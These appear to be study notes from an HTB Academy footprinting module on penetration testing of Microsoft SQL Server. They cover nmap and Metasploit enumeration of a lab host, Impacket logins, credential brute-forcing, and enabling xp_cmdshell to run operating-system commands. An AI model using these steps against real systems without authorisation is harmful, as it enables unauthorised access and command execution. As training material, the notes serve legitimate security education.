# MSSQL (Microsoft SQL Server)

> Microsoft's closed-source SQL-based relational database management system, primarily designed for Windows environments.

---

## Overview

**Microsoft SQL Server (MSSQL)** is Microsoft's SQL-based relational database management system.

| Characteristic | Details |
|----------------|---------|
| **Type** | Closed-source |
| **Primary OS** | Windows (versions exist for Linux/MacOS) |
| **Framework** | Strong native support for .NET |
| **Common Use** | Applications built on Microsoft's .NET framework |

> 📝 **Note:** Unlike MySQL (open-source), MSSQL is closed-source and most commonly found on Windows targets.

---

## Default Port

| Port | Protocol | Description |
|------|----------|-------------|
| **TCP 1433** | MSSQL | Default SQL Server port |
| **UDP 1434** | MSSQL Browser | SQL Server Browser service |

---

## SQL Server Management Studio (SSMS)

**SSMS** is the primary GUI client for managing MSSQL databases.

### Key Points for Pentesters

| Aspect | Details |
|--------|---------|
| **Installation** | Can be installed with MSSQL package OR separately |
| **Purpose** | Initial configuration and long-term database management |
| **Location** | Client-side application - can exist on ANY system, not just the database server |
| **Security Risk** | May contain **saved credentials** that allow database connection |

> ⚠️ **Pentesting Insight:** Finding SSMS installed on a compromised workstation could reveal saved credentials for database access!

---

## MSSQL Clients

| Client | Description |
|--------|-------------|
| **SQL Server Management Studio (SSMS)** | Microsoft's official GUI client |
| **mssql-cli** | Command-line interface for SQL Server |
| **SQL Server PowerShell** | PowerShell module for SQL Server management |
| **HeidiSQL** | Lightweight GUI database client |
| **SQLPro** | macOS SQL client |
| **Impacket's mssqlclient.py** | Python-based client (recommended for pentesting) |

### Locate Impacket's mssqlclient.py

```bash
locate mssqlclient
```
> Finds the path to `mssqlclient.py` on the system. On Kali, it's at `/usr/bin/impacket-mssqlclient`. The script is the primary MSSQL attack client for pentesters.

```
/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

> 💡 **Pentesting Tip:** `mssqlclient.py` is the most useful for pentesters - Impacket is pre-installed on most pentesting distributions.

---

## MSSQL System Databases

| Database | Description |
|----------|-------------|
| **master** | Tracks all system information for the SQL Server instance |
| **model** | Template database - structure for every new database created |
| **msdb** | SQL Server Agent uses this to schedule jobs & alerts |
| **tempdb** | Stores temporary objects |
| **resource** | Read-only database containing system objects (included with SQL Server) |

> 📚 **Reference:** [Microsoft System Databases Documentation](https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)

### Database Hierarchy

```
SQL Server Instance
├── master (system info)
├── model (template)
├── msdb (jobs/alerts)
├── tempdb (temporary)
├── resource (read-only system objects)
└── User Databases
    ├── Database1
    ├── Database2
    └── ...
```

---

## Default Configuration

### Default Service Account

When initially installed and configured for network access:

| Setting | Default Value |
|---------|---------------|
| **Service Account** | `NT SERVICE\MSSQLSERVER` |
| **Authentication** | Windows Authentication supported |
| **Encryption** | **NOT enforced** by default |

> ⚠️ **Security Warning:** Default configuration does not enforce encryption for client connections!

---

## Dangerous Settings

> 🎯 **Pentester Mindset:** Think like an IT admin - look for misconfigurations caused by busy workdays, multiple projects, and pressure to perform quickly.

### Common Misconfigurations

| Misconfiguration | Risk |
|------------------|------|
| **Unencrypted connections** | MSSQL clients connecting without encryption - credentials in plaintext |
| **Self-signed certificates** | Can be spoofed by attackers when encryption is used |
| **Named pipes enabled** | Can be exploited for lateral movement |
| **Weak/default `sa` credentials** | System administrator account with full database control |

### The `sa` Account

| Aspect | Details |
|--------|---------|
| **Full Name** | System Administrator |
| **Privileges** | Full control over SQL Server instance |
| **Risk** | Admins may forget to disable or use weak passwords |
| **Default** | Often left enabled with default/weak credentials |

---

## Authentication Modes

| Mode | Description |
|------|-------------|
| **Windows Authentication** | Uses Windows credentials (Kerberos/NTLM) |
| **SQL Server Authentication** | Uses SQL Server-specific username/password |
| **Mixed Mode** | Both Windows and SQL Server authentication |

---

## Footprinting the Service

### Nmap MSSQL Scripts

Nmap has default MSSQL scripts targeting the default TCP port 1433.

```bash
# Comprehensive MSSQL enumeration
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <target>
```
> Runs a full battery of MSSQL NSE scripts. `ms-sql-ntlm-info` extracts hostname and domain via NTLM challenge. `ms-sql-empty-password` checks if `sa` has a blank password. `ms-sql-xp-cmdshell` tests if OS command execution is enabled. Replace `<target>` with the target IP.

**Example Output:**

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false
```

**Key Information Gathered:**
- Hostname: SQL-01
- Database instance name: MSSQLSERVER
- Software version: Microsoft SQL Server 2019 RTM
- Named pipes enabled: Yes

---

### Metasploit MSSQL Ping

The `mssql_ping` auxiliary scanner provides helpful footprinting information:

```
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```
> The `mssql_ping` scanner enumerates MSSQL instance details via UDP 1434 (SQL Browser service). It reveals the server name, instance name, version, and whether named pipes are enabled — all without credentials. Replace `10.129.201.248` with your target IP.

**Example Output:**

```
[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

### Connecting with mssqlclient.py

If credentials are obtained, use Impacket's mssqlclient.py to connect and interact with T-SQL:

```bash
# Connect with Windows authentication
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```
> `-windows-auth` uses Windows domain authentication (Kerberos/NTLM) instead of SQL logins. Once connected, you get a `SQL>` prompt where you can run T-SQL queries. Replace `Administrator@10.129.201.248` with your username and target IP.

**Example Session:**

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL> select name from sys.databases

name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
Transactions
```

---

## Enumeration Commands

### Quick Nmap Scripts

```bash
# Enumerate MSSQL service
nmap -p 1433 --script ms-sql-info <target>

# Brute force MSSQL credentials
nmap -p 1433 --script ms-sql-brute <target>

# Check for empty sa password
nmap -p 1433 --script ms-sql-empty-password <target>

# Enumerate databases
nmap -p 1433 --script ms-sql-dac <target>

# Full MSSQL enumeration
nmap -p 1433 --script ms-sql-* <target>
```
> Individual MSSQL NSE scripts for targeted checks. `ms-sql-empty-password` and `ms-sql-brute` can be run without credentials. `ms-sql-*` runs all MSSQL scripts at once. Replace `<target>` with the target IP.

### Connect with Impacket's mssqlclient.py

```bash
# Connect with SQL authentication
impacket-mssqlclient <username>:<password>@<target>

# Connect with Windows authentication
impacket-mssqlclient <domain>/<username>:<password>@<target> -windows-auth

# Example
impacket-mssqlclient sa:password123@10.10.10.10
```
> `impacket-mssqlclient` supports both SQL authentication and Windows authentication. Once connected, type `help` to see extra shell commands. Replace usernames, passwords, and target IP with your values.

---

## Common MSSQL Commands

### Basic Commands

```sql
-- List all databases
SELECT name FROM sys.databases;

-- Use a specific database
USE master;

-- List tables in current database
SELECT * FROM information_schema.tables;

-- Get SQL Server version
SELECT @@version;

-- Get current user
SELECT CURRENT_USER;

-- Get server name
SELECT @@SERVERNAME;
```
> Basic T-SQL recon commands. Run these immediately after connecting to map the database. `SELECT @@version` reveals the SQL Server version for CVE research. `information_schema.tables` lists all tables in the selected database.

### User Enumeration

```sql
-- List all logins
SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- List sysadmin members
SELECT name FROM sys.server_principals WHERE is_srvrolemember('sysadmin', name) = 1;
```
> Shows all SQL logins and which ones have `sysadmin` rights. If your current user appears in the sysadmin list, you can enable `xp_cmdshell` for OS command execution.

---

## MSSQL Specific Attacks

### xp_cmdshell (Command Execution)

If `xp_cmdshell` is enabled, you can execute OS commands:

```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
```
> `xp_cmdshell` is a stored procedure that runs OS commands. It's disabled by default but can be re-enabled by a `sysadmin`. First enable "show advanced options", then enable `xp_cmdshell`, then `EXEC xp_cmdshell 'command'` to run anything on the OS. This gives you Remote Code Execution (RCE) as the SQL Server service account.

> ⚠️ **High Impact:** `xp_cmdshell` enables RCE on the database server!

### Linked Servers

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute queries on linked server
SELECT * FROM OPENQUERY("LinkedServerName", 'SELECT @@version');
```
> Linked servers let one SQL Server execute queries on another. If the linked server runs queries with elevated privileges, you may be able to escalate from a low-privilege account by running commands through the link. Always enumerate linked servers when you have any MSSQL access.

---

## Quick Reference

| Task | Command/Tool |
|------|--------------|
| **Find mssqlclient** | `locate mssqlclient` |
| **Connect (SQL Auth)** | `impacket-mssqlclient user:pass@target` |
| **Connect (Windows Auth)** | `impacket-mssqlclient domain/user:pass@target -windows-auth` |
| **Nmap enumeration** | `nmap -p 1433 --script ms-sql-* target` |
| **List databases** | `SELECT name FROM sys.databases;` |
| **Check version** | `SELECT @@version;` |
| **Command execution** | `EXEC xp_cmdshell 'command';` |

---

## Key Takeaways

1. **MSSQL is Windows-centric** - Most common on Windows targets running .NET applications
2. **SSMS can be anywhere** - Look for saved credentials on compromised workstations
3. **Default = Insecure** - Encryption not enforced, `sa` account often misconfigured
4. **Impacket is your friend** - `mssqlclient.py` is the go-to tool for pentesting
5. **xp_cmdshell = RCE** - If enabled (or can be enabled), you have command execution
6. **System databases are informative** - Always enumerate `master`, `msdb` for intel

---

*HTB Academy - Footprinting Module*
